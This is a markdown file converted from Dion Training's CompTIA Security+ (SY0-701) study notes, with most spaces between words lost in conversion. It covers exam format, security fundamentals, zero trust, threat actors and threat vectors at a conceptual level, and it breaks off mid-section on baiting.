@@ -1,0 +1,6861 @@
+# CompTIA+Security++(SY0-701)+Study+Guide
+
+## Page 1
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+CompTIASecurity+(SY0-701)
+
+StudyNotes
+
+Introduction
+
+● Introduction○ CompTIASecurity+(SY0-701)certificationisconsideredanintermediatelevel
+
+informationtechnologycertificationandanentrylevelcybersecuritycertificationthat
+
+focusesonyourabilitytoassessthesecuritypostureofanenterpriseenvironment○ Thiscertificationisdesignedforinformationtechnologyprofessionalsoraspiring
+
+cybersecurityprofessionalswhohavealreadyearnedtheirCompTIAA+andNetwork+
+
+certifications,butthisisarecommendationfromCompTIAandnotastrictrequirement■ Ifyouhavetheequivalentof1-2yearsofworkingwithhardware,software,and
+
+networks,thenyouwilldofineinthiscourse○ Thiscourseisdesignedasafulltextbookreplacement,butifyouwouldliketogeta
+
+textbooktostudyfromaswell,werecommendtheofficialCompTIASecurity+Student
+
+GuideavailabledirectlyfromCompTIA○ CompTIASecurity+(SY0-701)certificationexamconsistsoffivedomainsorareasof
+
+knowledge■ 12%ofGeneralSecurityConcepts■ 22%ofThreats,Vulnerabilities,andMitigations■ 18%ofSecurityArchitecture■ 28%ofSecurityOperations
+
+1https://www.DionTraining.com
+
+## Page 2
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+■ 20%ofSecurityProgramManagementandOversight○ WhentakingtheCompTIASecurity+certificationexamatthetestingcenteroronline
+
+usingthewebproctoringservice,youaregoingtohave90minutestoanswerupto90
+
+questions■ You’regoingtobeansweringmultiple-choicequestions,butyoumaygetafew
+
+multiple-selectquestionswheretheyaskyoutopick2or3correctanswersfora
+
+singlequestion■ Youwillalsogetahandfulofperformance-basedquestions○ TopasstheSecurity+certificationexam,youmustscoreatleast750pointsoutof900
+
+- ntheir100to900pointscale○ Totaketheexam,youdohavetopayanexamfeetocoverthecostoftesting,andyou
+dothatbybuyinganexamvoucher■ Howdoyousignupandscheduleyourexam?● CompTIAStore○ Youcandothisbygoingtostore.comptia.organdbuyingitfrom
+
+theirwebstore○ Thepricedoesvarydependingonwhichcountryyouwillbe
+
+takingyourexamfromsinceCompTIAusesregionbasedpricing● DionTraining○ Youcangotodiontraining.com/vouchersandpurchaseyour
+
+voucherdirectlyfromus,becauseweareacertifiedPlatinum
+
+LevelCompTIADeliveryPartner○ You’llsaveanextra10%orsoofftheregularCompTIAprice○ We’llgiveyoufreeaccesstooursearchablevideolibraryasa
+
+bonusforbuyingyourvoucherfromus
+
+2https://www.DionTraining.com
+
+## Page 3
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+○ 4tipsforsuccessinthiscourse■ Turnonclosedcaptioning■ Controltheplaybackspeed■ JoinourFBorDiscordgroup● facebook.com/groups/diontraining● diontraining.com/discord■ Downloadandprintthestudyguide
+
+● ExamTips○ Therewillbenotrickquestions■ Alwaysbeonthelookoutfordistractorsorredherrings■ Atleastoneofthefourlistedpossibleanswerchoicesthatarewrittentotryand
+
+distractyoufromthecorrectanswer○ Paycloseattentiontowordsinbold,italics,oralluppercase○ AnswerthequestionsbasedonCompTIASecurity+knowledge■ Incybersecurity,therereallyisno100%correctanswersintherealworld
+
+becauseeverythingissituational■ Whenindoubt,choosetheanswerthatiscorrectforthehighestnumberof
+
+situations○ Understandthekeyconceptsofthetestquestions○ Donotmemorizethetermswordforword,trytounderstandtheminstead
+
+○ Duringtheexam,theanswerswillbefrommultiple-choicestylequestions
+
+3https://www.DionTraining.com
+
+## Page 4
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+FundamentalsofSecurity
+
+Objectives:● 1.1-Compareandcontrastvarioustypesofsecuritycontrols● 1.2-Summarizefundamentalsecurityconcepts
+
+● FundamentalsofSecurity○ InformationSecurity■ Protectingdataandinformationfromunauthorizedaccess,modification,
+
+disruption,disclosure,anddestruction○ InformationSystemsSecurity■ Protectingthesystems(e.g.,computers,servers,networkdevices)thatholdand
+
+processcriticaldata○ CIATriad■ Confidentiality● Ensuresinformationisaccessibleonlytoauthorizedpersonnel(e.g.,
+
+encryption)■ Integrity● Ensuresdataremainsaccurateandunaltered(e.g.,checksums)■ Availability● Ensuresinformationandresourcesareaccessiblewhenneeded(e.g.,
+
+redundancymeasures)○ Non-Repudiation■ Guaranteesthatanactionoreventcannotbedeniedbytheinvolvedparties
+
+(e.g.,digitalsignatures)
+
+4https://www.DionTraining.com
+
+## Page 5
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+○ CIANAPentagon■ AnextensionoftheCIAtriadwiththeadditionofnon-repudiationand
+
+authentication○ TripleA’sofSecurity■ Authentication● Verifyingtheidentityofauserorsystem(e.g.,passwordchecks)■ Authorization● Determiningactionsorresourcesanauthenticatedusercanaccess(e.g.,
+
+permissions)■ Accounting● Trackinguseractivitiesandresourceusageforauditorbillingpurposes○ SecurityControlCategories■ Technical■ Managerial■ Operational■ Physical○ SecurityControlTypes■ Preventative■ Deterrent■ Detective■ Corrective■ Compensating■ Directive○ ZeroTrustModel■ Operatesontheprinciplethatnooneshouldbetrustedbydefault
+
+5https://www.DionTraining.com
+
+## Page 6
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+■ Toachievezerotrust,weusethecontrolplaneandthedataplane● ControlPlane○ Adaptiveidentity,threatscopereduction,policy-drivenaccess
+
+control,andsecuredzones● DataPlane○ Subject/system,policyengine,policyadministrator,and
+
+establishingpolicyenforcementpoints
+
+● ThreatsandVulnerabilities○ Threat■ Anythingthatcouldcauseharm,loss,damage,orcompromisetoourinformation
+
+technologysystems■ Cancomefromthefollowing● Naturaldisasters● Cyber-attacks● Dataintegritybreaches● Disclosureofconfidentialinformation○ Vulnerability■ Anyweaknessinthesystemdesignorimplementation■ Comefrominternalfactorslikethefollowing● Softwarebugs● Misconfiguredsoftware● Improperlyprotectednetworkdevices● Missingsecuritypatches● Lackofphysicalsecurity
+
+6https://www.DionTraining.com
+
+## Page 7
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+○ Wherethreatsandvulnerabilitiesintersect,thatiswheretherisktoyourenterprise
+
+systemsandnetworkslies■ Ifyouhaveathreat,butthereisnomatchingvulnerabilitytoit,thenyouhaveno
+
+risk■ Thesameholdstruethatifyouhaveavulnerabilitybutthere’snothreatagainst
+
+it,therewouldbenorisk○ RiskManagement■ Findingdifferentwaystominimizethelikelihoodofanoutcomeandachievethe
+
+desiredoutcome
+
+● Confidentiality○ Confidentiality■ Referstotheprotectionofinformationfromunauthorizedaccessanddisclosure■ Ensurethatprivateorsensitiveinformationisnotavailableordisclosedto
+
+unauthorizedindividuals,entities,orprocesses○ Confidentialityisimportantfor3mainreasons■ Toprotectpersonalprivacy■ Tomaintainabusinessadvantage■ Toachieveregulatorycompliance○ Toensureconfidentiality,weusefivebasicmethods■ Encryption● Processofconvertingdataintoacodetopreventunauthorizedaccess■ AccessControls● Bysettingupstronguserpermissions,youensurethatonlyauthorized
+
+personnelcanaccesscertaintypesdata
+
+7https://www.DionTraining.com
+
+## Page 8
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+■ DataMasking● Methodthatinvolvesobscuringspecificdatawithinadatabasetomakeit
+
+inaccessibleforunauthorizeduserswhileretainingtherealdata's
+
+authenticityanduseforauthorizedusers■ PhysicalSecurityMeasures● Ensureconfidentialityforbothphysicaltypesofdata,suchaspaper
+
+recordsstoredinafilingcabinet,andfordigitalinformationcontainedon
+
+serversandworkstations■ TrainingandAwareness● Conductregulartrainingonthesecurityawarenessbestpracticesthat
+
+employeescanusetoprotecttheirorganization’ssensitivedata
+
+● Integrity○ Integrity■ Helpsensurethatinformationanddataremainaccurateandunchangedfromits
+
+- riginalstateunlessintentionallymodifiedbyanauthorizedindividual■ Verifiestheaccuracyandtrustworthinessofdataovertheentirelifecycle○ Integrityisimportantforthreemainreasons■ Toensuredataaccuracy■ Tomaintaintrust■ Toensuresystemoperability○ Tohelpusmaintaintheintegrityofourdata,systems,andnetworks,weusuallyutilize
+fivemethods■ Hashing● Processofconvertingdataintoafixed-sizevalue
+
+8https://www.DionTraining.com
+
+## Page 9
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+■ DigitalSignatures● Ensurebothintegrityandauthenticity■ Checksums● Methodtoverifytheintegrityofdataduringtransmission
+
+■ AccessControls● Ensurethatonlyauthorizedindividualscanmodifydataandthisreduces
+
+theriskofunintentionalormaliciousalterations■ RegularAudits● Involvesystematicallyreviewinglogsandoperationstoensurethatonly
+
+authorizedchangeshavebeenmade,andanydiscrepanciesare
+
+immediatelyaddressed
+
+● Availability○ Availability■ Ensurethatinformation,systems,andresourcesareaccessibleandoperational
+
+whenneededbyauthorizedusers○ Ascybersecurityprofessionals,wevalueavailabilitysinceitcanhelpuswiththe
+
+following■ EnsuringBusinessContinuity■ MaintainingCustomerTrust■ UpholdinganOrganization'sReputation○ Toovercomethechallengesassociatedwithmaintainingavailability,thebeststrategyis
+
+touseredundancyinyoursystemsandnetworkdesigns■ Redundancy● Duplicationofcriticalcomponentsorfunctionsofasystemwiththe
+
+9https://www.DionTraining.com
+
+## Page 10
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+intentionofenhancingitsreliability○ Therearevarioustypesofredundancyyouneedtoconsiderwhendesigningyour
+
+systemsandnetworks■ ServerRedundancy● Involvesusingmultipleserversinaloadbalancedorfailoverconfiguration
+
+sothatifoneisoverloadedorfails,theotherserverscantakeoverthe
+
+loadtocontinuesupportingyourendusers■ DataRedundancy● Involvesstoringdatainmultipleplaces■ NetworkRedundancy● Ensuresthatifonenetworkpathfails,thedatacantravelthrough
+
+anotherroute■ PowerRedundancy● Involvesusingbackuppowersources,likegeneratorsandUPSsystems
+
+● Non-repudiation○ Non-repudiation■ Focusedonprovidingundeniableproofintheworldofdigitaltransactions■ Securitymeasurethatensuresindividualsorentitiesinvolvedina
+
+communicationortransactioncannotdenytheirparticipationortheauthenticity
+
+- ftheiractions○ DigitalSignatures■ Consideredtobeuniquetoeachuserwhoisoperatingwithinthedigitaldomain■ Createdbyfirsthashingaparticularmessageorcommunicationthatyouwantto
+digitallysign,andthenitencryptsthathashdigestwiththeuser’sprivatekey
+
+usingasymmetricencryption
+
+10https://www.DionTraining.com
+
+## Page 11
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+○ Non-repudiationisimportantforthreemainreasons■ Toconfirmtheauthenticityofdigitaltransactions■ Toensuretheintegrityofcriticalcommunications■ Toprovideaccountabilityindigitalprocesses
+
+● Authentication○ Authentication■ Securitymeasurethatensuresindividualsorentitiesarewhotheyclaimtobe
+
+duringacommunicationortransaction○ 5commonlyusedauthenticationmethods■ Somethingyouknow(KnowledgeFactor)● Reliesoninformationthatausercanrecall■ Somethingyouhave(PossessionFactor)● Reliesontheuserpresentingaphysicalitemtoauthenticatethemselves■ Somethingyouare(InherenceFactor)● Reliesontheuserprovidingauniquephysicalorbehavioralcharacteristic
+
+- fthepersontovalidatethattheyarewhotheyclaimtobe■ Somethingyoudo(ActionFactor)● Reliesontheuserconductingauniqueactiontoprovewhotheyare■ Somewhereyouare(LocationFactor)● Reliesontheuserbeinginacertaingeographiclocationbeforeaccessis
+granted○ Multi-FactorAuthenticationSystem(MFA)■ Securityprocessthatrequiresuserstoprovidemultiplemethodsofidentification
+
+toverifytheiridentity
+
+11https://www.DionTraining.com
+
+## Page 12
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+○ Authenticationiscriticaltounderstandbecauseofthefollowing■ Topreventunauthorizedaccess■ Toprotectuserdataandprivacy■ Toensurethatresourcesareaccessedbyvalidusersonly
+
+● Authorization○ Authorization■ Pertainstothepermissionsandprivilegesgrantedtousersorentitiesafterthey
+
+havebeenauthenticated○ Authorizationmechanismsareimportanttohelpuswiththefollowing■ Toprotectsensitivedata■ Tomaintainthesystemintegrityinourorganizations■ Tocreateamorestreamlineduserexperience
+
+● Accounting○ Accounting■ Securitymeasurethatensuresalluseractivitiesduringacommunicationor
+
+transactionareproperlytrackedandrecorded○ Yourorganizationshouldusearobustaccountingsystemsothatyoucancreatethe
+
+following■ Createanaudittrail● Providesachronologicalrecordofalluseractivitiesthatcanbeusedto
+
+tracechanges,unauthorizedaccess,oranomaliesbacktoasourceor
+
+pointintime■ Maintainregulatorycompliance● Maintainsacomprehensiverecordofallusers’activities
+
+12https://www.DionTraining.com
+
+## Page 13
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+■ Conductforensicanalysis● Usesdetailedaccountingandeventlogsthatcanhelpcybersecurity
+
+expertsunderstandwhathappened,howithappened,andhowto
+
+preventsimilarincidentsfromoccurringagain
+
+■ Performresourceoptimization● Organizationscanoptimizesystemperformanceandminimizecostsby
+
+trackingresourceutilizationandallocationdecisions■ Achieveuseraccountability● Thoroughaccountingsystemensuresusers’actionsaremonitoredand
+
+logged,deterringpotentialmisuseandpromotingadherencetothe
+
+- rganization’spolicies○ Toperformaccounting,weusuallyusedifferenttechnologieslikethefollowing■ SyslogServers● Usedtoaggregatelogsfromvariousnetworkdevicesandsystemssothat
+systemadministratorscananalyzethemtodetectpatternsoranomalies
+
+intheorganization’ssystems■ NetworkAnalysisTools● Usedtocaptureandanalyzenetworktrafficsothatnetwork
+
+administratorscangaindetailedinsightsintoallthedatamovingwithina
+
+network■ SecurityInformationandEventManagement(SIEM)Systems● Providesuswithareal-timeanalysisofsecurityalertsgeneratedby
+
+varioushardwareandsoftwareinfrastructureinanorganization
+
+13https://www.DionTraining.com
+
+## Page 14
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+● SecurityControlCategories○ 4BroadCategoriesofSecurityControls■ TechnicalControls● Technologies,hardware,andsoftwaremechanismsthatareimplemented
+
+tomanageandreducerisks
+
+■ ManagerialControls● Sometimesalsoreferredtoasadministrativecontrols● Involvethestrategicplanningandgovernancesideofsecurity■ OperationalControls● Proceduresandmeasuresthataredesignedtoprotectdataona
+
+day-to-daybasis● Aremainlygovernedbyinternalprocessesandhumanactions■ PhysicalControls● Tangible,real-worldmeasurestakentoprotectassets
+
+● SecurityControlTypes○ 6BasicTypesofSecurityControls■ PreventiveControls● Proactivemeasuresimplementedtothwartpotentialsecuritythreatsor
+
+breaches■ DeterrentControls● Discouragepotentialattackersbymakingtheeffortseemlessappealing
+
+- rmorechallenging■ DetectiveControls● Monitorandalertorganizationstomaliciousactivitiesastheyoccuror
+14https://www.DionTraining.com
+
+## Page 15
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+shortlythereafter■ CorrectiveControls● Mitigateanypotentialdamageandrestoreoursystemstotheirnormal
+
+state■ CompensatingControls● Alternativemeasuresthatareimplementedwhenprimarysecurity
+
+controlsarenotfeasibleoreffective■ DirectiveControls● Guide,inform,ormandateactions● Oftenrootedinpolicyordocumentationandsetthestandardsfor
+
+behaviorwithinanorganization
+
+● GapAnalysis○ GapAnalysis■ Processofevaluatingthedifferencesbetweenanorganization'scurrent
+
+performanceanditsdesiredperformance○ Conductingagapanalysiscanbeavaluabletoolfororganizationslookingtoimprove
+
+theiroperations,processes,performance,oroverallsecurityposture○ Thereareseveralstepsinvolvedinconductingagapanalysis■ Definethescopeoftheanalysis■ Gatherdataonthecurrentstateoftheorganization■ Analyzethedatatoidentifyanyareaswheretheorganization'scurrent
+
+performancefallsshortofitsdesiredperformance■ Developaplantobridgethegap
+
+15https://www.DionTraining.com
+
+## Page 16
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+○ 2BasicTypesofGapAnalysis■ TechnicalGapAnalysis● Involvesevaluatinganorganization'scurrenttechnicalinfrastructure● identifyinganyareaswhereitfallsshortofthetechnicalcapabilities
+
+requiredtofullyutilizetheirsecuritysolutions■ BusinessGapAnalysis● Involvesevaluatinganorganization'scurrentbusinessprocesses● Identifyinganyareaswheretheyfallshortofthecapabilitiesrequiredto
+
+fullyutilizecloud-basedsolutions■ PlanofActionandMilestones(POA&M)● Outlinesthespecificmeasurestoaddresseachvulnerability● Allocateresources● Setuptimelinesforeachremediationtaskthatisneeded
+
+● ZeroTrust○ ZeroTrustdemandsverificationforeverydevice,user,andtransactionwithinthe
+
+network,regardlessofitsorigin○ Tocreateazerotrustarchitecture,weneedtousetwodifferentplanes■ ControlPlane● Referstotheoverarchingframeworkandsetofcomponentsresponsible
+
+fordefining,managing,andenforcingthepoliciesrelatedtouserand
+
+systemaccesswithinanorganization● ControlPlanetypicallyencompassesseveralkeyelements○ AdaptiveIdentity■ Reliesonreal-timevalidationthattakesintoaccountthe
+
+user'sbehavior,device,location,andmore
+
+16https://www.DionTraining.com
+
+## Page 17
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+○ ThreatScopeReduction■ Limitstheusers’accesstoonlywhattheyneedfortheir
+
+worktasksbecausethisreducesthenetwork’spotential
+
+attacksurface■ Focusedonminimizingthe"blastradius"thatcouldoccur
+
+intheeventofabreach○ Policy-DrivenAccessControl■ Entailsdeveloping,managing,andenforcinguseraccess
+
+policiesbasedontheirrolesandresponsibilities○ SecuredZones■ Isolatedenvironmentswithinanetworkthataredesigned
+
+tohousesensitivedata● ControlPlaneusesaPolicyEngineandaPolicyAdministratortomake
+
+decisionsaboutaccess○ PolicyEngine■ Cross-referencestheaccessrequestwithitspredefined
+
+policies○ PolicyAdministrator■ Usedtoestablishandmanagetheaccesspolicies■ DataPlane● Consistsofthefollowing○ Subject/System■ Referstotheindividualorentityattemptingtogainaccess○ PolicyEnforcementPoint■ Wherethedecisiontograntordenyaccessisactually
+
+executed
+
+17https://www.DionTraining.com
+
+## Page 18
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+ThreatActors
+
+Objectives:● 1.2-Summarizefundamentalsecurityconcepts● 2.1-Compareandcontrastcommonthreatactorsandmotivations● 2.2-Explaincommonthreatvectorsandattacksurfaces
+
+● ThreatActors○ ThreatActorMotivations■ DataExfiltration■ Blackmail■ Espionage■ ServiceDisruption■ FinancialGain,■ Philosophical/PoliticalBeliefs■ EthicalReasons■ Revenge■ Disruption/Chaos■ War○ ThreatActorAttributes■ Internalvs.ExternalThreatActors■ Differencesinresourcesandfunding■ Levelofsophistication○ TypesofThreatActors■ UnskilledAttackers● Limitedtechnicalexpertise,usereadilyavailabletools
+
+18https://www.DionTraining.com
+
+## Page 19
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+■ Hacktivists● Drivenbypolitical,social,orenvironmentalideologies■ OrganizedCrime● Executecyberattacksforfinancialgain(e.g.,ransomware,identitytheft)■ Nation-stateActor● Highlyskilledattackerssponsoredbygovernmentsforcyberespionageor
+
+warfare■ InsiderThreats● Securitythreatsoriginatingfromwithintheorganization○ ShadowIT■ ITsystems,devices,software,orservicesmanagedwithoutexplicitorganizational
+
+approval○ ThreatVectorsandAttackSurfaces■ Message-based■ Image-based■ File-based■ VoiceCalls■ RemovableDevices■ UnsecuredNetworks○ DeceptionandDisruptionTechnologies■ Honeypots● Decoysystemstoattractanddeceiveattackers■ Honeynets● Networkofdecoysystemsforobservingcomplexattacks■ Honeyfiles● Decoyfilestodetectunauthorizedaccessordatabreaches
+
+19https://www.DionTraining.com
+
+## Page 20
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+■ Honeytokens● Fakedatatoalertadministratorswhenaccessedorused
+
+● ThreatActorMotivations○ Thereisadifferencebetweentheintentoftheattackandthemotivationthatfuelsthat
+
+attack■ ThreatActorsIntent● Specificobjectiveorgoalthatathreatactorisaimingtoachievethrough
+
+theirattack■ ThreatActorsMotivation● Underlyingreasonsordrivingforcesthatpushesathreatactortocarry
+
+- uttheirattack○ Differentmotivationsbehindthreatactors■ DataExfiltration● Unauthorizedtransferofdatafromacomputer■ FinancialGain● Achievedthroughvariousmeans,suchasransomwareattacks,orthrough
+bankingtrojansthatallowthemtostealfinancialinformationinorderto
+
+gainunauthorizedaccessintothevictims'bankaccounts■ Blackmail● Attackerobtainssensitiveorcompromisinginformationaboutan
+
+individualoranorganizationandthreatenstoreleasethisinformationto
+
+thepublicunlesscertaindemandsaremet■ ServiceDisruption● Somethreatactorsaimtodisrupttheservicesofvariousorganizations,
+
+eithertocausechaos,makeapoliticalstatement,ortodemandaransom
+
+20https://www.DionTraining.com
+
+## Page 21
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+■ PhilosophicalorPoliticalBeliefs● Attacksthatareconductedduetothephilosophicalorpoliticalbeliefsof
+
+theattackersisknownashacktivism● Commonmotivationforaspecifictypeofthreatactorknownasa
+
+hacktivist■ EthicalReasons● Contrarytomaliciousthreatactors,ethicalhackers,alsoknownas
+
+Authorizedhackers,aremotivatedbyadesiretoimprovesecurity■ Revenge● Itcanalsobeamotivationforathreatactorthatwantstotargetanentity
+
+thattheybelievehaswrongedtheminsomeway■ DisruptionorChaos● Creatingandspreadingmalwaretolaunchingsophisticatedcyberattacks
+
+againstthecriticalinfrastructureinapopulatedcity■ Espionage● Spyingonindividuals,organizations,ornationstogathersensitiveor
+
+classifiedinformation■ War● Cyberwarfarecanbeusedtodisruptacountry'sinfrastructure,
+
+compromiseitsnationalsecurity,andtocauseeconomicdamage
+
+● ThreatActorAttributes○ 2MostBasicAttributesofaThreatActor■ InternalThreatActors● Individualsorentitieswithinanorganizationwhoposeathreattoits
+
+security
+
+21https://www.DionTraining.com
+
+## Page 22
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+■ ExternalThreatActors● Individualsorgroupsoutsideanorganizationwhoattempttobreachits
+
+cybersecuritydefenses○ Resourcesandfundingavailabletothespecificthreatactor■ Tools,skills,andpersonnelatthedisposalofagiventhreatactor○ Levelofsophisticationandcapabilityofthespecificthreatactor■ Referstotheirtechnicalskill,thecomplexityofthetoolsandtechniquesthey
+
+use,andtheirabilitytoevadedetectionandcountermeasures■ Intheworldofcybersecurity,weusuallyclassifythelowestskilledthreatactors
+
+as"scriptkiddies"● ScriptKiddie○ Individualwithlimitedtechnicalknowledge○ usepre-madesoftwareorscriptstoexploitcomputersystemsand
+
+networks■ Nation-stateactors,AdvancedPersistentThreatsandothershavehighlevelsof
+
+sophisticationandcapabilitiesandpossessadvancedtechnicalskills● Usesophisticatedtoolsandtechniques
+
+● UnskilledAttackers○ UnskilledAttacker(ScriptKiddie)■ Individualwholacksthetechnicalknowledgetodeveloptheirownhackingtools
+
+- rexploits■ Theselow-skilledthreatactorsneedtorelyonscriptsandprogramsthathave
+beendevelopedbyothers○ Howdotheseunskilledattackerscausedamage?■ OnewayistolaunchaDDoSattack
+
+22https://www.DionTraining.com
+
+## Page 23
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+■ AnunskilledattackercansimplyenterintheIPaddressofthesystemtheywant
+
+totarget,andthenclickabuttontolaunchanattackeragainstthattarget
+
+● Hacktivists○ Hacktivists■ Individualsorgroupsthatusetheirtechnicalskillstopromoteacauseordrive
+
+socialchangeinsteadofforpersonalgain○ Hacktivism■ Activitiesinwhichtheuseofhackingandothercybertechniquesisusedto
+
+promoteoradvanceapoliticalorsocialcause○ Toaccomplishtheirobjectives,hacktivistsuseawiderangeoftechniquestoachieve
+
+theirgoals■ WebsiteDefacement● Formofelectronicgraffitiandisusuallytreatedasanactofvandalism■ DistributedDenialofService(DDoS)Attacks● Attemptingtooverwhelmthevictim'ssystemsornetworkssothatthey
+
+cannotbeaccessedbytheorganization'slegitimateusers■ Doxing● Involvesthepublicreleaseofprivateinformationaboutanindividualor
+
+- rganization
+■ LeakingofSensitiveData● Releasingsensitivedatatothepublicatlargeovertheinternet○ Hacktivistsareprimarilymotivatedbytheirideologicalbeliefsratherthantryingto
+
+achievefinancialgains
+
+23https://www.DionTraining.com
+
+## Page 24
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+○ Mostwell-knownhacktivistgroupsisknownas“Anonymous”■ Anonymous● Looselyaffiliatedcollectivethathasbeeninvolvedinnumerous
+
+high-profileattacksovertheyearsfortargetingorganizationsthatthey
+
+perceiveasactingunethicallyoragainstthepublicinterestatlarge
+
+● OrganizedCrime○ Organizedcybercrimegroupsaregroupsorsyndicatesthathavebandedtogetherto
+
+conductcriminalactivitiesinthedigitalworld■ Sophisticatedandwellstructured■ Useresourcesandtechnicalskillsforillicitgain○ Intermsoftheirtechnicalcapabilities,organizedcrimegroupspossessaveryhighlevel
+
+- ftechnicalcapabilityandtheyoftenemployadvancedhackingtechniquesandtools■ CustomMalware■ Ransomware■ SophisticatedPhishingCampaigns○ Thesecriminalgroupswillengageinavarietyofillicitactivitiestogeneraterevenuefor
+theirmembers■ DataBreaches■ IdentityTheft■ OnlineFraud■ RansomwareAttacks○ Unlikehacktivistsornationstateactors,organizedcybercrimegroupsarenottypically
+
+drivenbyideologicalorpoliticalobjectives■ Thesegroupsmaybehiredbyotherentities,includinggovernments,toconduct
+
+cyberoperationsandattacksontheirbehalf
+
+24https://www.DionTraining.com
+
+## Page 25
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+■ Money,notothermotivationsistheobjectiveoftheirattackseveniftheattack
+
+takesplaceinthepoliticalsphere
+
+● Nation-stateActor○ Nation-stateActor■ Groupsorindividualsthataresponsoredbyagovernmenttoconductcyber
+
+- perationsagainstothernations,organizations,orindividuals○ Sometimes,thesethreatactorsattemptwhatisknownasafalseflagattack■ FalseFlagAttack● Attackthatisorchestratedinsuchawaythatitappearstooriginatefrom
+adifferentsourceorgroupthantheactualperpetrators,withtheintent
+
+tomisleadinvestigatorsandattributetheattacktosomeoneelse○ Nation-stateactorspossessadvancedtechnicalskillsandextensiveresources,andthey
+
+arecapableofconductingcomplex,coordinatedcyberoperationsthatemployavariety
+
+- ftechniquessuchas■ Creatingcustommalware■ Usingzero-dayexploits■ Becominganadvancedpersistentthreats○ AdvancedPersistentThreat(APT)■ Termthatusedtobeusedsynonymouslywithanation-stateactorbecauseof
+theirlong-termpersistenceandstealth■ Aprolongedandtargetedcyberattackinwhichanintrudergainsunauthorized
+
+accesstoanetworkandremainsundetectedforanextendedperiodwhiletrying
+
+tostealdataormonitornetworkactivitiesratherthancauseimmediatedamage■ Theseadvancedpersistentthreatsareoftensponsoredbyanation-stateorits
+
+proxies,likeorganizedcybercrimegroups
+
+25https://www.DionTraining.com
+
+## Page 26
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+○ Whatmotivatesanation-stateactor?■ Nation-stateactorsaremotivatedtoachievetheirlong-termstrategicgoals,and
+
+theyarenotseekingfinancialgain
+
+● InsiderThreats○ InsiderThreats■ Cybersecuritythreatsthatoriginatefromwithintheorganization■ Willhavevaryinglevelsofcapabilities○ Insiderthreatscantakevariousforms■ DataTheft■ Sabotage■ Misuseofaccessprivileges○ Eachinsiderthreatisdrivenbydifferentmotivations■ Somearedrivenbyfinancialgainandtheywanttoprofitfromthesaleof
+
+sensitiveorganizationaldatatoothers■ Somemaybemotivatedbyrevengeandareaimingtoharmtheorganizationdue
+
+tosomekindofperceivedwrongleviedagainsttheinsider■ Somemaytakeactionsasaresultofcarelessnessoralackofawarenessof
+
+cybersecuritybestpractices○ Remember■ Insiderthreatreferstothepotentialriskposedbyindividualswithinan
+
+- rganizationwhohaveaccesstosensitiveinformationandsystems,andwhomay
+misusethisaccessformaliciousorunintendedpurposes■ Tomitigatetheriskofaninsiderthreatbeingsuccessful,organizationsshould
+
+implementthefollowing● Zero-trustarchitecture
+
+26https://www.DionTraining.com
+
+## Page 27
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+● Employrobustaccesscontrols● Conductregularaudits● Provideeffectiveemployeesecurityawarenessprograms
+
+● ShadowIT○ ShadowIT■ Useofinformationtechnologysystems,devices,software,applications,and
+
+serviceswithoutexplicitorganizationalapproval■ IT-relatedprojectsthataremanagedoutsideof,andwithouttheknowledgeof,
+
+theITdepartment○ WhydoesShadowITexist?■ Anorganization'ssecuritypostureisactuallysettoohighoristoocomplexfor
+
+businessoperationstooccurwithoutbenegativelyaffected○ BringYourOwnDevices(BYOD)■ Involvestheuseofpersonaldevicesforworkpurposes
+
+● ThreatVectorsandAttackSurfaces○ ThreatVector■ Meansorpathwaybywhichanattackercangainunauthorizedaccesstoa
+
+computerornetworktodeliveramaliciouspayloadorcarryoutanunwanted
+
+action○ AttackSurface■ Encompassesallthevariouspointswhereanunauthorizedusercantrytoenter
+
+datatoorextractdatafromanenvironment■ Canbeminimizedby● RestrictingAccess
+
+27https://www.DionTraining.com
+
+## Page 28
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+● Removingunnecessarysoftware● Disablingunusedprotocols○ Thinkofthreatvectorasthe"how"ofanattack,whereastheattacksurfaceisthe
+
+"where"oftheattack○ Severaldifferentthreatvectorsthatcouldbeusedtoattackyourenterprisenetworks■ Messages● Message-basedthreatvectorsincludethreatsdeliveredviaemail,simple
+
+messageservice(SMStextmessaging),orotherformsofinstant
+
+messaging● Phishingcampaignsarecommonlyusedaspartofamessage-based
+
+threatvectorwhenanattackerimpersonatesatrustedentitytotrickits
+
+victimsintorevealingtheirsensitiveinformationtotheattacker■ Images● Image-basedthreatvectorsinvolvetheembeddingofmaliciouscode
+
+insideofanimagefilebythethreatactor■ Files● Thefiles,oftendisguisedaslegitimatedocumentsorsoftware,canbe
+
+transferredasemailattachments,throughfile-sharingservices,orhosted
+
+- namaliciouswebsite■ VoiceCalls● Vhishing○ Useofvoicecallstotrickvictimsintorevealingtheirsensitive
+informationtoanattacker
+
+28https://www.DionTraining.com
+
+## Page 29
+
+CompTIASecurity+(SY0-701) (StudyNotes)
+
+■ RemovableDevices● Onecommontechniqueusedwithremovabledevicesisknownasbaiting○ Baiting■ Attackermightleaveamalware-infectedUSBdriveina
+
+locationwheretheirtargetmightfindit,suchasinthe
+
